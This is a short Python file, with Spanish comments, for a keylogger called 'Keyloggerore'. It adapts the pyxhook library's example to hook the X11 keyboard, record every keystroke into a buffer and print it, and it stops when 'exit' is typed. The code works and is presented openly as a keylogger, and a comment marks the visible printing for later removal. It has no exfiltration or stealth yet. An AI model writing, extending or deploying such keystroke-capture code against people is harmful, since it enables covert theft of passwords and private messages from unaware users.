import pyxhook
import time

class Keyloggerore:

    def __init__(self):
        self.buffer = ""
        self.running = True

    ### Funcion (MODIFICADA) de https://github.com/JeffHoogland/pyxhook/blob/master/example.py
    # This function is called every time a key is presssed
    def kbevent(self,event):
        global running, buffer
        
        if hasattr(event, 'Key'): # se toma event.Key (los otros son: event.KeyID, event.Ascii)
            self.buffer += event.Key
        
        # print key info 
        print(event) # ELIMINAR DESPUES
        print(self.buffer)

        # If the "string" value matches spacebar, terminate the while loop
        if "exit" in self.buffer.lower():
            print("[x] Se detecto 'exit'. Finalizando keylogger.")
            running = False
            
    def callback():
        pass
        
     


if __name__ == "__main__":

    print("Keylogger iniciado")
    logger = Keyloggerore()
    
    ### codigo tomado de https://github.com/JeffHoogland/pyxhook/blob/master/example.py
    # Create hookmanager
    hookman = pyxhook.HookManager()
    # Define our callback to fire when a key is pressed down
    hookman.KeyDown = logger.kbevent
    # Hook the keyboard
    hookman.HookKeyboard()
    # Start our listener
    hookman.start()

    # Create a loop to keep the application running
    running = True
    while running:
        time.sleep(0.1)

    # Close the listener when we are done
    hookman.cancel()
    ### fin de example.py
    
    print("Keylogger detenido")
        
        
    

